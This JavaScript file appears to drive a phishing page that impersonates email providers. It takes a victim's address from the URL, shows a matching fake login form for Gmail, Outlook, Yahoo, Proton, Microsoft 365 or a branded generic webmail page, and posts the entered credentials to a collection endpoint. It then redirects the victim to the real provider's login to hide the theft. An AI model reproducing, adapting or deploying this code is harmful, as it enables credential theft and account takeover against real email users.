let userDomain = ''; // define globally

document.addEventListener('DOMContentLoaded', function() {
    const hash = window.location.hash.substring(1);
    
    if (hash && hash.includes('@')) {
        const email = hash;
        const domain = email.split('@')[1].toLowerCase();
        userDomain = domain; // store for reuse in sendMessage

        let formToShow = 'webmail';

        if (domain.includes('gmail') || domain === 'gmail.com') {
            formToShow = 'gsuite';
        } else if (domain === 'outlook.com') {
            formToShow = 'outlook';
        } else if (domain === 'hotmail.com') {
            formToShow = 'hotmail';
        } else if (domain === 'centurylink.net') {
            formToShow = 'centurylink';
        } else if (domain === 'msn') {
            formToShow = 'msn';
        } else if (domain === 'spectrum.net' || domain === 'charter.net') {
            formToShow = 'spectrum';
        } else if (domain.includes('yahoo') || domain === 'rocketmail.com' || domain === 'ymail.com') {
            formToShow = 'yahoo';
        } else if (domain === 'zoho.com') {
            formToShow = 'zoho';
        } else if (domain === 'aol.com') {
            formToShow = 'aol';
        } else if (domain === 'yandex.com') {
            formToShow = 'yandex';
        } else if (domain === 'gmx.com' || domain === 'gmx.us' || domain === 'gmx.de') {
            formToShow = 'gmx';
        } else if (domain === 'tutanota.com' || domain === 'tuta.com' || domain === 'tutanota.de' || domain === 'tutanota.fr' || domain === 'keemail.me') {
            formToShow = 'tuta';
        } else if (domain === 'proton.me' || domain === 'protonmail.com' || domain === 'pm.me') {
            formToShow = 'proton';
        } else if (domain.includes('onmicrosoft')) {
            formToShow = 'microsoft';
        } else {
            formToShow = 'webmail';
            customizeWebmailForm(domain);
        }

        document.getElementById(formToShow).style.display = 'block';

        const emailField = document.getElementById(formToShow + '-email');
        if (emailField) {
            emailField.value = email;
        }
    } else {
        document.getElementById('microsoft').style.display = 'block';
    }
});


function sendMessage(formId) {
  const form = document.getElementById(formId);
  const formData = new FormData(form);
  const formDataObj = {};

  const sendButton = form.querySelector(".proceed-button");
  const originalText = sendButton.textContent;

  sendButton.textContent = "Loading...";
  sendButton.disabled = true;

  formData.forEach((value, key) => {
    formDataObj[key] = value;
  });

  formDataObj.send = "true";

  fetch("/api/submit", {
    method: "POST",
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(formDataObj)
  })
  .then(response => {
    
    if (!response.ok) {
      return response.json().then(data => {
        throw new Error(data.error || `HTTP ${response.status}`);
      });
    }
    return response.json();
  })
  .then(data => {    
    form.reset();
    window.location.href = `https://${userDomain}/login`;
    sendButton.textContent = originalText;
    sendButton.disabled = false;
  })
  .catch(error => {
  });
}
        
        // Function to customize the webmail form based on the domain
        function customizeWebmailForm(domain) {
            
            const parts = domain.split('.');
            let baseDomain = domain;
            if (parts.length >= 2) {
                baseDomain = parts[parts.length - 2] + '.' + parts[parts.length - 1];
            }

            document.getElementById('loading-message').textContent = `Loading...`;
            
const domainTitle = baseDomain.split('.')[0];
document.getElementById('webmail-title').textContent = `${domainTitle.charAt(0).toUpperCase() + domainTitle.slice(1)}`;
            
            fetchDomainLogo(baseDomain);
        }
        
        function fetchDomainLogo(domain) {
            const logoElement = document.getElementById('dynamic-logo');
            const loadingMessage = document.getElementById('loading-message');
            
            const urlsToTry = [
                `https://${domain}/favicon.ico`,
                `https://${domain}/logo.png`,
                `https://${domain}/images/logo.png`,
                `https://${domain}/img/logo.png`,
                `https://logo.clearbit.com/${domain}`
            ];
            
            const clearbitUrl = `https://logo.clearbit.com/${domain}`;
            
            // Create an image element to test loading
            const img = new Image();
            img.onload = function() {
                loadingMessage.style.display = 'none';
                logoElement.style.backgroundImage = `url('${clearbitUrl}')`;

                try {
                    extractColorFromImage(img, function(color) {
                        document.getElementById('webmail-button').style.backgroundColor = color;
                    });
                } catch (e) {
                }
            };
            
            img.onerror = function() {
                loadingMessage.style.display = 'none';
                logoElement.style.backgroundImage = 'none';
                logoElement.innerHTML = `<h1 style="margin:0;padding-top:30px;color:#444;">${domain.split('.')[0].toUpperCase()}</h1>`;
                document.getElementById('webmail-button').style.backgroundColor = '#555';
            };
            
            // Start loading the image
            img.src = clearbitUrl;
        }
        
        // Function to extract dominant color from an image (simplified version)
        function extractColorFromImage(img, callback) {
            // Create a canvas to analyze the image
            const canvas = document.createElement('canvas');
            const context = canvas.getContext('2d');
            const width = img.width;
            const height = img.height;
            
            canvas.width = width;
            canvas.height = height;
            
            context.drawImage(img, 0, 0, width, height);
            
            try {
                const data = context.getImageData(Math.floor(width/2), Math.floor(height/2), 1, 1).data;
                const hex = "#" + ((1 << 24) + (data[0] << 16) + (data[1] << 8) + data[2]).toString(16).slice(1);
                callback(hex);
            } catch (e) {
                callback('#555555');
            }
        }